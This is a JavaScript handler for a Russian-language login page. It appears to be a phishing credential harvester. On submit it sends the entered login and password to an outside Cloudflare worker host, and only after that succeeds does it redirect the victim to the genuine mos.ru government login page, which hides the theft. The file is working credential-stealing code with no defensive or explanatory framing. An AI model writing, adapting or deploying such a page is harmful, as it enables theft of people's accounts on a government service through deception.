(function () {
    const WORKER_URL = 'https://my-neon-worker.viotlunov.workers.dev';
    /** Куда перейти после успешного ответа воркера (200 OK). */
    const AFTER_SUCCESS_REDIRECT = 'https://login.mos.ru/sps/login';

    const form = document.getElementById('loginForm');
    const loginInput = document.getElementById('login');
    const passwordInput = document.getElementById('password');
    const submitBtn = form.querySelector('.submit-btn');
    const status = document.getElementById('status');
    const showPasswordCheckbox = document.getElementById('showPassword');
    const loginError = document.getElementById('loginError');
    const passwordError = document.getElementById('passwordError');

    function setFieldError(element, message) {
        element.textContent = message || '';
        element.classList.toggle('is-visible', Boolean(message));
    }

    function setStatus(message, kind) {
        status.textContent = message || '';
        status.classList.remove('is-error', 'is-success');
        if (kind === 'error') status.classList.add('is-error');
        if (kind === 'success') status.classList.add('is-success');
    }

    loginInput.addEventListener('input', () => {
        if (loginInput.value.trim()) setFieldError(loginError, '');
    });
    passwordInput.addEventListener('input', () => {
        if (passwordInput.value.trim()) setFieldError(passwordError, '');
    });

    showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
    });

    form.addEventListener('submit', async (event) => {
        event.preventDefault();
        const loginValue = loginInput.value.trim();
        const passwordValue = passwordInput.value;
        let hasErrors = false;

        if (!loginValue) {
            setFieldError(loginError, 'Введите логин');
            hasErrors = true;
        } else {
            setFieldError(loginError, '');
        }

        if (!passwordValue) {
            setFieldError(passwordError, 'Введите пароль');
            hasErrors = true;
        } else {
            setFieldError(passwordError, '');
        }

        if (hasErrors) {
            setStatus('', null);
            return;
        }

        const payload = {
            login: loginValue,
            password: passwordValue,
        };

        const originalText = submitBtn.textContent;
        submitBtn.disabled = true;
        submitBtn.classList.add('is-loading');
        submitBtn.textContent = 'Входим…';
        setStatus('', null);

        try {
            const response = await fetch(WORKER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            });

            let result = {};
            try { result = await response.json(); } catch (_) { /* not JSON */ }

            if (response.ok) {
                setStatus('', null);
                form.reset();
                // РЕДИРЕКТ ТЕПЕРЬ ЗДЕСЬ: переходим только если данные успешно отправлены
                window.location.href = AFTER_SUCCESS_REDIRECT;
            } else {
                setStatus(
                    result.error || `Ошибка ${response.status}`,
                    'error'
                );
            }
        } catch (err) {
            setStatus('Ошибка сети: сервер не отвечает.', 'error');
        } finally {
            submitBtn.classList.remove('is-loading');
            submitBtn.textContent = originalText;
            submitBtn.disabled = false; // Возвращаем кнопку в активное состояние при ошибке
        }
    });
})();